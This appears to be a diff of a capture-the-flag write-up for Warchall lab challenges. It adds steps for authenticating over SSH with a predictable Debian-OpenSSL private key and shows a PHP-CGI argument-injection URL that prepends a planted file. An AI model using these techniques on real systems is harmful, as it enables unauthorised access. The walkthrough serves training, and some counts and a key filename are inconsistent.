@@ -1,8 +1,7 @@
 # Warchall-challenge
-## Of the 11 challenges we had to deal with, I succeeded in 8. Here are the 3 challenges I couldn't solve:
-* Nurxxed
-* SSH... Z is sleeping
+## Of the 11 challenges we had to deal with, I succeeded in 9. Here are the 2 challenges I couldn't solve:
 * 7 Tropical Fruits
+* Nurxxed
 ## So I'm going to explain step by step how I captured the flag for the 8 challenges I successfully completed.
 #
 > To start with, I create an SSH account and then connect to the account I've just created by using a terminal.
@@ -208,7 +207,29 @@ echo file_get_contents("../config.php");
 rce.warchall.net/index.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3d/var/tmp/s.txt
 ```
 * At the first sight it did not work. Nothing than the index.php's content was shown in the browser. But the flag for this level is now stoked in `/var/tmp/s.txt`
-# 8. Tryouts
+# 8. SSH... Z is sleeping
+> To get the password for this level we have to connect as level 8 without password, for this we need SSH key.
+## Here's how I did it for this level:
+* First, I use this command to check the public key fingerprint, to see if you can obtain it in md5 and exploit one of the md5 fingerprint vulnerabilities:
+```
+ssh-keygen -l -E md5 -f /home/level/08_sshz/backups/authorized_keys.backup
+```
+* We need to find the private key to authenticate in level 8. Go on the site :
+```
+https://hdm.io/tools/debian-openssl/
+```
+> to download 2048-bit SSH keys.
+* After downloading and extracting this zip, you can access several files containing private keys and having names in the form of md5 but without the `:`
+* We look for the fingerprint without the `:` obtained from the command with the public key, we then obtain a file with the same name and send it to our personal directory in warchall with this command :
+```
+scp -P 19198 C:\Users\UserName\Downloads\rsa\2048\2bcd07a701e94a0474d77ee4d6d0f80 -23669 username@warchall.net:/home/user/username
+```
+* then, going back to the server, we identify ourselves with the private key path :
+```
+ssh -i ~/2bcd07a701e94a0474d77ee4d6d0f806-23669 level08@warchall.net -p 19198
+```
+### The solution will be displayed 
+# 9. Tryouts
 > Find in /home/level/matrixman/13_tryouts
 > * In /home/level/matrixman/13_tryouts, there's a C language code called tryouts.c and its compiled version tryouts. There's also a solution.txt file that we don't have access to.
 > * The **tryouts.c** file asks us to guess a random number generated using /dev/urandom
